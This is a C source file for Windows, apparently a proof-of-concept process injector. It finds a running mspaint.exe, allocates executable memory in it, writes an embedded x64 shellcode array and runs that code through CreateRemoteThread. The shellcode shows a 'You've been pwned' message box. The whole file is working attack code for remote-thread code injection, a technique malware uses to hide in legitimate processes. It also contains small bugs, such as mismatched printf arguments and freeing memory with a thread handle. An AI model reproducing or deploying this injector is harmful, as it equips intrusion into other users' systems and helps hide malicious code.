#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main(int argc, char const *argv[])
{
    // Create the shellcode variable
    unsigned char shellcode[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x3e\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
        "\x56\xff\xd5\x59\x6f\x75\x27\x76\x65\x20\x62\x65\x65\x6e"
        "\x20\x70\x77\x6e\x65\x64\x20\x62\x79\x20\x46\x6c\x6f\x78"
        "\x72\x79\x61\x00\x59\x6f\x75\x27\x76\x65\x20\x62\x65\x65"
        "\x6e\x20\x70\x61\x77\x6e\x65\x64\x00\x75\x73\x65\x72\x33"
        "\x32\x2e\x64\x6c\x6c\x00";

    // Create a snapshot of the different processes running on the computer
    PROCESSENTRY32 pe32;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE processes_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    Process32First(processes_snapshot, &pe32);

    do
    {
        if (wcscmp(pe32.szExeFile, L"mspaint.exe") == 0) // compare the different process names
        {
            // Create a pointer to the mspaint.exe process
            HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

            // Allocate a memory page for the shellcode on the mspaint.exe process
            LPVOID allocated_mem = VirtualAllocEx(h_process, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

            if (allocated_mem == NULL)
            {
                printf("Memory allocation failed \n", GetLastError());
                return 1;
            }

            // Write the shellcode to the memory page of the process
            WriteProcessMemory(h_process, allocated_mem, shellcode, sizeof(shellcode), NULL);

            //Execute the shellcode into the mspaint.exe process
            HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

            if(h_thread == NULL){
                printf("Failed to get the handle of the process \n", GetLastError());
                return 1;
            }

            WaitForSingleObject(h_thread, INFINITE);

            VirtualFreeEx(h_thread, allocated_mem, 0, MEM_RELEASE);

            CloseHandle(h_thread);

            CloseHandle(h_process);

            break;
        }
    } while (Process32Next(processes_snapshot, &pe32));

    return 0;
}
